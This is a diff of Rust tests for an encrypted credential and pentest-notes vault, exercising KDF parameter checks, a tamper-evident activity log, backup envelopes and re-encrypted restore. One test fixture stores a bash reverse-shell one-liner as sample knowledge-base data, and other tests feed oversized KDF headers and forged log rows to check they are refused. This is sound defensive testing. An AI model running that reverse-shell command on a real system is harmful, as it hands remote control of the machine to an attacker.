+    fn test_kdf_params_parse_and_compatibility() {
+        let current = vault::KdfParams::parse(&vault::KdfParams::CURRENT.encode()).unwrap();
+        assert_eq!(current, vault::KdfParams::CURRENT);
+        for hostile in ["m=99999999,t=3,p=1", "m=262144,t=0,p=1", "m=262144,t=99,p=1", "m=262144,t=3,p=64", "m=4,t=3,p=1", "m=abc,t=3,p=1", "x=1", ""] {
+            assert!(vault::KdfParams::parse(hostile).is_err(), "should reject {hostile:?}");
+        }
+        assert!(vault::KdfParams::LEGACY.weaker_than(&vault::KdfParams::CURRENT));
+        assert!(!vault::KdfParams::CURRENT.weaker_than(&vault::KdfParams::CURRENT));
+
+        // derive_key is still the library default, so older vaults and backups open.
+        let salt = [9u8; 32];
+        let default = {
+            let mut out = [0u8; 32];
+            argon2::Argon2::default().hash_password_into(b"pw-123456789", &salt, &mut out).unwrap();
+            out
+        };
+        assert_eq!(vault::derive_key("pw-123456789", &salt).unwrap(), default);
+
+        // Verification reads its settings from the hash, old or new.
+        let old_hash = vault::hash_password_with("pw-123456789", vault::KdfParams::LEGACY).unwrap();
+        let new_hash = vault::hash_password("pw-123456789").unwrap();
+        assert!(new_hash.contains("m=262144,t=3,p=1"));
+        assert!(vault::verify_password("pw-123456789", &old_hash).unwrap());
+        assert!(vault::verify_password("pw-123456789", &new_hash).unwrap());
+        assert!(!vault::verify_password("wrong-password", &new_hash).unwrap());
+    }
+
+    #[test]
+    fn test_activity_chain_detects_tampering() {
+        let (dir, path, dek) = format_2_vault("v3-chain");
+        let conn = Connection::open(&path).unwrap();
+        bring_up_to_date(&conn, V2_PASSWORD, &dek).unwrap();
+        let intact = |conn: &Connection| activity::verify_chain(conn, &dek).unwrap();
+        assert!(intact(&conn).intact);
+        let count: i64 = conn.query_row("SELECT COUNT(*) FROM activity_log", [], |r| r.get(0)).unwrap();
+        assert!(count >= 4);
+
+        // Entries written while locked wait, then seal on top of the chain.
+        activity::log_action(&conn, "unlock_failed", "wrong master password");
+        let status = intact(&conn);
+        assert!(status.intact);
+        assert_eq!(status.pending, 1);
+        assert_eq!(activity::seal_pending(&conn, &dek).unwrap(), 1);
+        assert_eq!(intact(&conn).pending, 0);
+
+        let backup_copy = |label: &str| {
+            let copy = dir.join(format!("{label}.db"));
+            conn.execute("VACUUM INTO ?1", [copy.to_str().unwrap()]).unwrap();
+            Connection::open(copy).unwrap()
+        };
+
+        // Edited detail.
+        let edited = backup_copy("edited");
+        edited.execute("UPDATE activity_log SET detail = 'nothing happened' WHERE seq = 2", []).unwrap();
+        let status = activity::verify_chain(&edited, &dek).unwrap();
+        assert!(!status.intact);
+        assert_eq!(status.problem.as_deref(), Some("entry 2 was changed"));
+
+        // A middle entry deleted.
+        let gap = backup_copy("gap");
+        gap.execute("DELETE FROM activity_log WHERE seq = 2", []).unwrap();
+        assert!(!activity::verify_chain(&gap, &dek).unwrap().intact);
+
+        // The newest entry cut off, then a new locked-time entry appended so the
+        // numbers line up again: the head still catches it, and sealing refuses.
+        let cut = backup_copy("cut");
+        cut.execute("DELETE FROM activity_log WHERE seq = (SELECT MAX(seq) FROM activity_log)", []).unwrap();
+        activity::log_action(&cut, "unlock", "vault unlocked");
+        let status = activity::verify_chain(&cut, &dek).unwrap();
+        assert!(!status.intact, "a cut-off tail must be detected");
+        assert!(activity::seal_pending(&cut, &dek).is_err(), "must not seal over a broken chain");
+        assert!(!activity::verify_chain(&cut, &dek).unwrap().intact, "the damage must stay visible");
+
+        // A forged sealed entry.
+        let forged = backup_copy("forged");
+        forged.execute(
+            "INSERT INTO activity_log (id, action, detail, seq, mac) VALUES ('x', 'unlock', 'forged', (SELECT MAX(seq) + 1 FROM activity_log), 'deadbeef')",
+            [],
+        ).unwrap();
+        assert!(!activity::verify_chain(&forged, &dek).unwrap().intact);
+
+        // The wrong key cannot vouch for the chain.
+        assert!(!activity::verify_chain(&conn, &[1u8; 32]).unwrap().intact);
+        drop((edited, gap, cut, forged, conn));
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn test_backup_envelope_roundtrip_legacy_and_hostile_files() {
+        let json = r#"{"version":"1.1","credentials":[],"projects":[],"journal_entries":[],"kb_entries":[]}"#;
+        let sealed = seal_backup(json, "backup-pass").unwrap();
+        assert!(sealed.starts_with("encra-backup:2:m=262144,t=3,p=1:"));
+        assert_eq!(open_backup(&sealed, "backup-pass").unwrap().as_str(), json);
+        assert!(open_backup(&sealed, "wrong-pass").is_err());
+
+        // A Cobrypt-era file: "salt:payload", default Argon2, unbound.
+        let salt = [5u8; 32];
+        let key = vault::derive_key("backup-pass", &salt).unwrap();
+        let legacy = format!("{}:{}", base64::engine::general_purpose::STANDARD.encode(salt), vault::encrypt(&key, json).unwrap());
+        assert_eq!(open_backup(&legacy, "backup-pass").unwrap().as_str(), json);
+
+        // A crafted header asking for 95 GiB of memory is refused before use.
+        let hostile = sealed.replacen("m=262144", "m=99999999", 1);
+        assert!(open_backup(&hostile, "backup-pass").unwrap_err().contains("out of range"));
+        assert!(open_backup("encra-backup:2:m=262144,t=3,p=1", "backup-pass").is_err());
+    }
+
     #[test]
     fn test_legacy_key_derivation_compatibility() {
         let legacy_salt = [0x4b, 0x65, 0x79, 0x52, 0x50, 0x54, 0x30, 0x31];
@@ -1729,7 +2082,9 @@ mod tests {
             let enc_dek: String = conn.query_row("SELECT value FROM vault_config WHERE key='encrypted_dek'", [], |r| r.get(0)).unwrap();
             let salt_b64: String = conn.query_row("SELECT value FROM vault_config WHERE key='kdf_salt'", [], |r| r.get(0)).unwrap();
             let salt = base64::engine::general_purpose::STANDARD.decode(&salt_b64).unwrap();
-            let wrap_key = vault::derive_key(new_password, &salt).unwrap();
+            let params = migrate::stored_kdf_params(&conn).unwrap();
+            assert_eq!(params, vault::KdfParams::CURRENT, "a reset must store the current settings");
+            let wrap_key = vault::derive_key_with(new_password, &salt, params).unwrap();
             let final_dek = vault::unwrap_dek(&enc_dek, &wrap_key).unwrap();
 
             let enc: String = conn.query_row("SELECT password_encrypted FROM credentials WHERE id='id1'", [], |r| r.get(0)).unwrap();
@@ -2104,6 +2459,7 @@ mod tests {
         {
             let conn = Connection::open(&source).unwrap();
             seed_vault(&conn, &source_dek);
+            bring_up_to_date(&conn, "source-password-123", &source_dek).unwrap();
 
             let backup = backup::collect_all(&conn, &source_dek).unwrap();
             assert_eq!(backup.version, "1.1");
@@ -2120,54 +2476,58 @@ mod tests {
 
             let conn = Connection::open(&destination).unwrap();
             conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();
-            backup::restore_all(&conn, &prepared).unwrap();
+            backup::restore_all(&conn, &destination_dek, &prepared).unwrap();
         }
 
-        // Reopen and confirm every field decrypts with the DESTINATION key.
+        // Reopen and confirm every field decrypts with the DESTINATION key,
+        // through the same read paths the app uses.
         {
-            let conn = Connection::open(&destination).unwrap();
-            let dec = |v: &str| vault::decrypt_to_string(&destination_dek, v).unwrap();
+            let conn = vault::init_db(&destination).unwrap();
+            let key = &destination_dek;
 
-            let count: i64 = conn.query_row("SELECT COUNT(*) FROM credentials", [], |r| r.get(0)).unwrap();
-            assert_eq!(count, 2, "both credentials must import");
-
-            let username: String = conn.query_row("SELECT username FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
-            assert_eq!(dec(&username), "dev@example.com");
-            let password: String = conn.query_row("SELECT password_encrypted FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
-            assert_eq!(dec(&password), "gh_p@$$w0rd");
-            let url: String = conn.query_row("SELECT url FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
-            assert_eq!(dec(&url), "https://github.com");
-            let notes: String = conn.query_row("SELECT notes FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
-            assert_eq!(dec(&notes), "personal account");
-            let totp: String = conn.query_row("SELECT totp_secret FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
-            assert_eq!(dec(&totp), "JBSWY3DPEHPK3PXP");
+            let list = credentials::list_summaries(&conn, key).unwrap();
+            assert_eq!(list.len(), 2, "both credentials must import");
+            let github = list.iter().find(|c| c.service == "github.com").expect("names decrypt after import");
+            assert_eq!(github.username, "dev@example.com");
+            assert!(github.has_totp);
+            assert_eq!(credentials::reveal_password(&conn, key, &github.id).unwrap().as_str(), "gh_p@$$w0rd");
+            let detail = credentials::detail(&conn, key, &github.id).unwrap();
+            assert_eq!(detail.url, "https://github.com");
+            assert_eq!(detail.notes, "personal account");
+            assert!(credentials::totp_code(&conn, key, &github.id).unwrap().is_some(), "2FA secret must survive");
 
             // The short password specifically exercises the Base64-padding class
             // of bug that used to break certain ciphertext lengths.
-            let short_pw: String = conn.query_row("SELECT password_encrypted FROM credentials WHERE service='aws'", [], |r| r.get(0)).unwrap();
-            assert_eq!(dec(&short_pw), "short12chars");
+            let aws = list.iter().find(|c| c.service == "aws").unwrap();
+            assert_eq!(credentials::reveal_password(&conn, key, &aws.id).unwrap().as_str(), "short12chars");
 
-            let description: String = conn.query_row("SELECT description FROM projects WHERE name='Home Lab'", [], |r| r.get(0)).unwrap();
-            assert_eq!(dec(&description), "passive recon");
-            let target: String = conn.query_row("SELECT target FROM projects LIMIT 1", [], |r| r.get(0)).unwrap();
-            assert_eq!(dec(&target), "192.168.1.0/24");
+            let (pid, name, description, target): (String, String, String, String) = conn
+                .query_row("SELECT id, name, description, target FROM projects LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?)))
+                .unwrap();
+            let open = |table: &str, id: &str, column: &str, stored: &str| fields::open_to_string(key, table, id, column, stored).unwrap();
+            assert_eq!(open("projects", &pid, "name", &name), "Home Lab");
+            assert_eq!(open("projects", &pid, "description", &description), "passive recon");
+            assert_eq!(open("projects", &pid, "target", &target), "192.168.1.0/24");
 
-            let (title, content): (String, String) = conn.query_row("SELECT title, content FROM journal_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
-            assert_eq!(dec(&title), "found open port");
-            assert_eq!(dec(&content), "port 22 open");
+            let (eid, title, content): (String, String, String) = conn
+                .query_row("SELECT id, title, content FROM journal_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)))
+                .unwrap();
+            assert_eq!(open("journal_entries", &eid, "title", &title), "found open port");
+            assert_eq!(open("journal_entries", &eid, "content", &content), "port 22 open");
 
-            let (kb_title, kb_command, kb_desc, kb_tags): (String, String, String, String) =
-                conn.query_row("SELECT title, command, description, tags FROM kb_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?))).unwrap();
-            assert_eq!(dec(&kb_title), "reverse shell");
-            assert_eq!(dec(&kb_command), "bash -i >& /dev/tcp/host/4444 0>&1");
-            assert_eq!(dec(&kb_desc), "standard shell");
-            assert_eq!(dec(&kb_tags), "shell,bash");
+            let (kid, kb_title, kb_command, kb_desc, kb_tags): (String, String, String, String, String) = conn
+                .query_row("SELECT id, title, command, description, tags FROM kb_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?)))
+                .unwrap();
+            assert_eq!(open("kb_entries", &kid, "title", &kb_title), "reverse shell");
+            assert_eq!(open("kb_entries", &kid, "command", &kb_command), "bash -i >& /dev/tcp/host/4444 0>&1");
+            assert_eq!(open("kb_entries", &kid, "description", &kb_desc), "standard shell");
+            assert_eq!(open("kb_entries", &kid, "tags", &kb_tags), "shell,bash");
 
             // Proof that re-encryption really happened: the source key must not
             // be able to read anything the destination now stores.
-            assert!(vault::decrypt_to_string(&source_dek, &username).is_err(), "source key must not read imported credentials");
-            assert!(vault::decrypt_to_string(&source_dek, &title).is_err(), "source key must not read imported journal data");
-            assert!(vault::decrypt_to_string(&source_dek, &kb_title).is_err(), "source key must not read imported commands");
+            assert!(fields::open(&source_dek, "projects", &pid, "name", &name).is_err(), "source key must not read imported cases");
+            assert!(fields::open(&source_dek, "journal_entries", &eid, "title", &title).is_err(), "source key must not read imported journal data");
+            assert!(fields::open(&source_dek, "kb_entries", &kid, "title", &kb_title).is_err(), "source key must not read imported commands");
         }
 
         std::fs::remove_dir_all(dir).unwrap();
@@ -2183,6 +2543,7 @@ mod tests {
         let backup = {
             let conn = Connection::open(&source).unwrap();
             seed_vault(&conn, &source_dek);
+            bring_up_to_date(&conn, "source-password-123", &source_dek).unwrap();
             backup::collect_all(&conn, &source_dek).unwrap()
         };
 
@@ -2197,7 +2558,7 @@ mod tests {
             ).unwrap();
 
             let prepared = backup::prepare_for_import(backup, &destination_dek).unwrap();
-            let result = backup::restore_all(&conn, &prepared);
+            let result = backup::restore_all(&conn, &destination_dek, &prepared);
             assert!(result.is_err(), "import must fail when a later insert fails");
 
             let credentials: i64 = conn.query_row("SELECT COUNT(*) FROM credentials", [], |r| r.get(0)).unwrap();
@@ -2278,15 +2639,15 @@ mod tests {
         let conn = Connection::open(&destination).unwrap();
         conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();
         // Would violate the foreign key if the project were not created first.
-        backup::restore_all(&conn, &prepared).unwrap();
+        backup::restore_all(&conn, &dek, &prepared).unwrap();
 
         let projects: i64 = conn.query_row("SELECT COUNT(*) FROM projects", [], |r| r.get(0)).unwrap();
         assert_eq!(projects, 1, "the missing project must be created");
-        let joined: String = conn.query_row(
-            "SELECT p.name FROM journal_entries j JOIN projects p ON j.project_id = p.id",
-            [], |r| r.get(0),
+        let (pid, stored_name): (String, String) = conn.query_row(
+            "SELECT p.id, p.name FROM journal_entries j JOIN projects p ON j.project_id = p.id",
+            [], |r| Ok((r.get(0)?, r.get(1)?)),
         ).unwrap();
-        assert_eq!(joined, "Ghost Engagement");
+        assert_eq!(fields::open_to_string(&dek, "projects", &pid, "name", &stored_name).unwrap(), "Ghost Engagement");
 
         std::fs::remove_dir_all(dir).unwrap();
     }
